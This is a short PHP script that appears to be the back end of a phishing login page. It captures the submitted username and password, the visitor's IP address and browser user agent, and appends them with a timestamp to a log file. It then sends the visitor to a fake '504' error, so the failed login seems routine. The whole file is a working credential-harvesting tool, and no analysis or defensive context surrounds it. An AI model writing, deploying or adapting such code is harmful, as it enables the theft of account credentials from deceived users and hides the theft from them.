<?php

$email = $_POST['user'];
$passwd = $_POST['password'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$user_addr = $_SERVER['REMOTE_ADDR'];

if( isset($email) && isset($passwd) ) {
	$file = fopen("/logs/logins.txt", "a");

	fwrite($file, $email . ' ; ');
	fwrite($file, base64_encode($passwd) . ' ; ');
	fwrite($file, $user_agent . ' ; ');
	fwrite($file, $user_addr . ' ; ');
	fwrite($file, date('d-m-Y h:i:s') . ' ; ' . PHP_EOL);

	fclose($file);
	
	//echo 'Data :)';
} else {
	//echo 'No data';
}

$error = 504;

header('Location: index.php?error=' . $error);
exit();
?>

